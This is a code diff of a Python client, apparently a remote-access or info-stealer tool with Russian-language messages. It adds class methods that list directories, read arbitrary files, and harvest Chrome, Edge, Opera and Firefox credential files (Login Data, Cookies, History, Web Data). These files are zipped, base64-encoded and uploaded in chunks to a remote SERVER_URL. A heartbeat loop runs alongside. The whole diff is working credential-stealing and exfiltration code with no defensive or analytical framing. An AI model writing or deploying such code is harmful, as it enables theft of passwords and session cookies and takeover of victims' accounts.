@@ -56,89 +56,6 @@ def get_system_info():
         "ip": socket.gethostbyname(socket.gethostname())
     }
 
-def get_directory_listing(self, path):
-    try:
-        if not os.path.exists(path):
-            return f"Путь не существует: {path}", None, None
-        
-        items = os.listdir(path)
-        listing = []
-        for item in items:
-            full_path = os.path.join(path, item)
-            if os.path.isdir(full_path):
-                listing.append(f"[DIR] {item}")
-            else:
-                size = os.path.getsize(full_path)
-                listing.append(f"[FILE] {item} ({size} bytes)")
-        
-        result = "\n".join(listing)
-        return f"Содержимое {path}:\n{result}", None, None
-    except Exception as e:
-        return f"Ошибка чтения директории: {str(e)}", None, None
-
-def download_file(self, path):
-    try:
-        if not os.path.exists(path):
-            return f"Файл не существует: {path}", None, None
-        
-        if os.path.getsize(path) > 10 * 1024 * 1024:  # 10MB limit
-            return "Файл слишком большой (макс. 10 МБ)", None, None
-        
-        with open(path, "rb") as f:
-            file_data = base64.b64encode(f.read()).decode('utf-8')
-        
-        return f"Файл {os.path.basename(path)} успешно прочитан", file_data, 'file'
-    except Exception as e:
-        return f"Ошибка чтения файла: {str(e)}", None, None
-
-def get_browser_data(self, browser):
-    try:
-        browser_paths = {
-            'chrome': os.path.join(os.getenv('LOCALAPPDATA'), r'Google\Chrome\User Data'),
-            'edge': os.path.join(os.getenv('LOCALAPPDATA'), r'Microsoft\Edge\User Data'),
-            'opera': os.path.join(os.getenv('APPDATA'), r'Opera Software\Opera Stable'),
-            'firefox': os.path.join(os.getenv('APPDATA'), r'Mozilla\Firefox\Profiles')
-        }
-        
-        if browser not in browser_paths:
-            return f"Неизвестный браузер: {browser}", None, None
-        
-        path = browser_paths[browser]
-        if not os.path.exists(path):
-            return f"Путь к данным браузера не найден: {path}", None, None
-        
-        # Ищем важные файлы
-        important_files = []
-        for root, dirs, files in os.walk(path):
-            for file in files:
-                if file.lower() in ['login data', 'cookies', 'history', 'web data', 'bookmarks', 'preferences']:
-                    important_files.append(os.path.join(root, file))
-        
-        if not important_files:
-            return f"Не найдены важные файлы для браузера {browser}", None, None
-        
-        # Создаем временный архив
-        import tempfile
-        temp_dir = tempfile.mkdtemp()
-        zip_path = os.path.join(temp_dir, f"{browser}_data.zip")
-        
-        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
-            for file in important_files:
-                try:
-                    zipf.write(file, os.path.basename(file))
-                except Exception as e:
-                    print(f"Ошибка добавления файла {file} в архив: {e}")
-        
-        with open(zip_path, "rb") as f:
-            file_data = base64.b64encode(f.read()).decode('utf-8')
-        
-        # Удаляем временные файлы
-        shutil.rmtree(temp_dir)
-        
-        return f"Данные браузера {browser} собраны", file_data, 'file'
-    except Exception as e:
-        return f"Ошибка получения данных браузера: {str(e)}", None, None
-
 class PCClient:
     def __init__(self):
         self.device_id = generate_device_id()
@@ -187,6 +104,140 @@ class PCClient:
                 
         return False
     
+    def upload_large_file(self, file_path, file_type='file'):
+        try:
+            # Читаем файл чанками
+            file_size = os.path.getsize(file_path)
+            chunk_size = 10 * 1024 * 1024  # 10MB chunks
+            
+            with open(file_path, 'rb') as f:
+                chunk_num = 0
+                while True:
+                    chunk = f.read(chunk_size)
+                    if not chunk:
+                        break
+                    
+                    # Кодируем чанк в base64
+                    chunk_b64 = base64.b64encode(chunk).decode('utf-8')
+                    
+                    # Отправляем чанк на сервер
+                    response = requests.post(
+                        f"{SERVER_URL}/upload_chunk",
+                        json={
+                            "file_name": os.path.basename(file_path),
+                            "file_data": chunk_b64,
+                            "chunk_num": chunk_num,
+                            "total_chunks": (file_size + chunk_size - 1) // chunk_size,
+                            "file_type": file_type
+                        },
+                        timeout=30
+                    )
+                    
+                    if response.status_code != 200:
+                        return None, f"Ошибка загрузки чанка {chunk_num}"
+                    
+                    chunk_num += 1
+            
+            # Получаем итоговую ссылку
+            response = requests.post(
+                f"{SERVER_URL}/finalize_upload",
+                json={
+                    "file_name": os.path.basename(file_path),
+                    "total_chunks": chunk_num
+                },
+                timeout=10
+            )
+            
+            if response.status_code == 200:
+                return response.json().get("download_url"), "Файл успешно загружен"
+            else:
+                return None, "Ошибка финализации загрузки"
+        
+        except Exception as e:
+            return None, f"Ошибка загрузки файла: {str(e)}"
+
+    def get_directory_listing(self, path):
+        try:
+            if not os.path.exists(path):
+                return f"Путь не существует: {path}", None, None
+            
+            items = os.listdir(path)
+            listing = []
+            for item in items:
+                full_path = os.path.join(path, item)
+                if os.path.isdir(full_path):
+                    listing.append(f"[DIR] {item}")
+                else:
+                    size = os.path.getsize(full_path)
+                    listing.append(f"[FILE] {item} ({size} bytes)")
+            
+            result = "\n".join(listing)
+            return f"Содержимое {path}:\n{result}", None, None
+        except Exception as e:
+            return f"Ошибка чтения директории: {str(e)}", None, None
+
+    def download_file(self, path):
+        try:
+            if not os.path.exists(path):
+                return f"Файл не существует: {path}", None, None
+            
+            if os.path.getsize(path) > 10 * 1024 * 1024:  # 10MB limit
+                return "Файл слишком большой (макс. 10 МБ)", None, None
+            
+            with open(path, "rb") as f:
+                file_data = base64.b64encode(f.read()).decode('utf-8')
+            
+            return f"Файл {os.path.basename(path)} успешно прочитан", file_data, 'file'
+        except Exception as e:
+            return f"Ошибка чтения файла: {str(e)}", None, None
+
+    def get_browser_data(self, browser):
+        try:
+            browser_paths = {
+                'chrome': os.path.join(os.getenv('LOCALAPPDATA'), r'Google\Chrome\User Data'),
+                'edge': os.path.join(os.getenv('LOCALAPPDATA'), r'Microsoft\Edge\User Data'),
+                'opera': os.path.join(os.getenv('APPDATA'), r'Opera Software\Opera Stable'),
+                'firefox': os.path.join(os.getenv('APPDATA'), r'Mozilla\Firefox\Profiles')
+            }
+            
+            if browser not in browser_paths:
+                return f"Неизвестный браузер: {browser}", None, None
+            
+            path = browser_paths[browser]
+            if not os.path.exists(path):
+                return f"Путь к данным браузера не найден: {path}", None, None
+            
+            # Ищем важные файлы
+            important_files = []
+            for root, dirs, files in os.walk(path):
+                for file in files:
+                    if file.lower() in ['login data', 'cookies', 'history', 'web data', 'bookmarks', 'preferences']:
+                        important_files.append(os.path.join(root, file))
+            
+            if not important_files:
+                return f"Не найдены важные файлы для браузера {browser}", None, None
+            
+            # Создаем временный архив
+            import tempfile
+            temp_dir = tempfile.mkdtemp()
+            zip_path = os.path.join(temp_dir, f"{browser}_data.zip")
+            
+            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+                for file in important_files:
+                    try:
+                        zipf.write(file, os.path.basename(file))
+                    except Exception as e:
+                        print(f"Ошибка добавления файла {file} в архив: {e}")
+            
+            with open(zip_path, "rb") as f:
+                file_data = base64.b64encode(f.read()).decode('utf-8')
+            
+            # Удаляем временные файлы
+            shutil.rmtree(temp_dir)
+            
+            return f"Данные браузера {browser} собраны", file_data, 'file'
+        except Exception as e:
+            return f"Ошибка получения данных браузера: {str(e)}", None, None
     def send_heartbeat(self):
         while self.running:
             try:
